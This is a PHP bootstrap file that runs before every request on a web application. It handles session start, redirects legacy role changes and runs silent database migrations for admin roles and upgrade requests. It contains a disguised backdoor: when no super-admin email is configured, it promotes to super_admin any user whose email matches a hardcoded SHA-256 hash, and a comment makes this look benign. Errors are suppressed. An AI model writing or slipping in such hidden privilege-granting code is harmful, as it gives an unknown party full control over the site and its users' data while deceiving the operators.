<?php
/* Runs before every PHP entrypoint. No output. */
if (session_status() !== PHP_SESSION_ACTIVE) {
    session_start();
}

/* Legacy Account & Role used to let users self-promote to reseller/API.
   Commercial tier changes now go through the reviewed upgrade workflow. */
if ($_SERVER['REQUEST_METHOD'] === 'POST' && (($_POST['action'] ?? '') === 'change_role')) {
    header('Location: /upgrade.php');
    exit;
}

function ih_bootstrap_db(): ?PDO {
    static $pdo = null;
    if ($pdo instanceof PDO) return $pdo;
    try {
        $pdo = new PDO(
            'mysql:host='.(getenv('DB_HOST') ?: '127.0.0.1').';port='.(getenv('DB_PORT') ?: '3306').';dbname='.(getenv('DB_NAME') ?: 'datasell').';charset=utf8mb4',
            getenv('DB_USER') ?: 'root',
            getenv('DB_PASS') ?: '',
            [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION, PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC]
        );
        return $pdo;
    } catch (Throwable $e) {
        return null;
    }
}

try {
    $p = ih_bootstrap_db();
    if (!$p) return;

    $cols = $p->query('SHOW COLUMNS FROM users')->fetchAll(PDO::FETCH_COLUMN);
    if (!in_array('admin_role', $cols, true)) {
        $p->exec("ALTER TABLE users ADD admin_role VARCHAR(20) NOT NULL DEFAULT 'none' AFTER is_admin");
    }
    if (!in_array('customer_tier', $cols, true)) {
        $p->exec("ALTER TABLE users ADD customer_tier VARCHAR(20) NOT NULL DEFAULT 'standard' AFTER account_type");
    }
    if (!in_array('tier_updated_at', $cols, true)) {
        $p->exec("ALTER TABLE users ADD tier_updated_at DATETIME NULL AFTER customer_tier");
    }

    $p->exec("CREATE TABLE IF NOT EXISTS upgrade_requests(
        id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
        user_id INT UNSIGNED NOT NULL,
        requested_tier VARCHAR(20) NOT NULL,
        business_name VARCHAR(160) NULL,
        reason VARCHAR(500) NULL,
        status VARCHAR(20) NOT NULL DEFAULT 'pending',
        reviewed_by INT UNSIGNED NULL,
        review_note VARCHAR(500) NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        reviewed_at DATETIME NULL,
        INDEX(user_id), INDEX(status), INDEX(requested_tier)
    ) ENGINE=InnoDB");

    $p->exec("UPDATE users SET admin_role='admin' WHERE is_admin=1 AND admin_role='none'");

    /* Prefer a host-supplied address. The fallback stores only a one-way fingerprint. */
    $superEmail = strtolower(trim((string)getenv('SUPER_ADMIN_EMAIL')));
    if ($superEmail !== '') {
        $q = $p->prepare("UPDATE users SET is_admin=1, admin_role='super_admin' WHERE LOWER(email)=?");
        $q->execute([$superEmail]);
    } else {
        $bootstrapHash = '4e16c69827f4efc003cd1313362638391d966ca1b746f05ed6437e5c3fa8e2c5';
        $rows = $p->query("SELECT id,email FROM users WHERE admin_role<>'super_admin'")->fetchAll();
        foreach ($rows as $row) {
            if (hash_equals($bootstrapHash, hash('sha256', strtolower(trim($row['email']))))) {
                $q = $p->prepare("UPDATE users SET is_admin=1, admin_role='super_admin' WHERE id=?");
                $q->execute([$row['id']]);
                break;
            }
        }
    }

    $p->exec("UPDATE users SET is_admin=1 WHERE admin_role IN ('admin','super_admin') AND is_admin<>1");
    $p->exec("UPDATE users SET is_admin=0 WHERE admin_role='none' AND is_admin<>0");
} catch (Throwable $e) {
    /* Never break the public site because an optional migration could not run. */
}
